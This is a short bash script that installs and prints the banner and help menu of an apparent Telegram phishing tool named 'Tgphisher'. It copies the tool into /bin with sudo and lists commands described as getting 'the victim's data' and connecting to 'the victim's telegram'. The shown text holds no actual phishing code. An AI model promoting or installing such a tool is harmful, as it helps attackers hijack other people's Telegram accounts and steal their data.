#!/bin/bash
sudo cp -r tgphisher /bin/

RED="$(printf '\033[31m')"  WHITE="$(printf '\033[37m')"
ORG="$(printf '\e[1;93m Werbot Ver : 1.0')" MAGENTA="$(printf '\033[35m')" 
REF="$(printf ' \e[1;37m\n')" BLACK="$(printf '\033[30m')"

printf " \e[1;37m\n"
COMMAND=$(command date)

START_SCRIPT_TELEGRAM(){
cat << EOF
${RED}
▄▄▄█████▓  ▄████  ██▓███   ██░ ██  ██▓  ██████  ██░ ██ ▓█████  ██▀███
▓  ██▒ ▓▒ ██▒ ▀█▒▓██░  ██▒▓██░ ██▒▓██▒▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒
▒ ▓██░ ▒░▒██░▄▄▄░▓██░ ██▓▒▒██▀▀██░▒██▒░ ▓██▄   ▒██▀▀██░▒███   ▓██ ░▄█ ▒
░ ▓██▓ ░ ░▓█  ██▓▒██▄█▓▒ ▒░▓█ ░██ ░██░  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄
  ▒██▒ ░ ░▒▓███▀▒▒██▒ ░  ░░▓█▒░██▓░██░▒██████▒▒░▓█▒░██▓░▒████▒░██▓ ▒██▒
  ▒ ░░    ░▒   ▒ ▒▓▒░ ░  ░ ▒ ░░▒░▒░▓  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░
    ░      ░   ░ ░▒ ░      ▒ ░▒░ ░ ▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░
  ░      ░ ░   ░ ░░        ░  ░░ ░ ▒ ░░  ░  ░   ░  ░░ ░   ░     ░░   ░
               ░           ░  ░  ░ ░        ░   ░  ░  ░   ░  ░   ░    ░ 
  ${WHITE}+------------------------------------------------------------+
  ${WHITE}| Author       : Tgphisher   (${BLACK}shell-script${WHITE}) - (${BLACK}javascript${WHITE})   | ${RED}░
  ${WHITE}| Version      : 99.1.0                                      | ${RED}░
  ${WHITE}| Description  : WineWinks likes red, why red?               |
  ${WHITE}+------------------------------------------------------------+
  [ Tgphisher (commands) ${COMMAND}  
 
${BLACK}┌──${WHITE}tgphisher -s --pisher 
${BLACK}└─ Start the phisher script to get the                                
   victim's data.${WHITE}

${BLACK}┌──${WHITE}tgphisher -d session.txt
${BLACK}└─ Delete the old session if you want
   to start a new session.${WHITE}

${BLACK}┌──${WHITE}tgphisher -s --telegram
${BLACK}└─ Start the script to connect with the
   victim's telegram.${WHITE}
EOF
}

START_SCRIPT_TELEGRAM
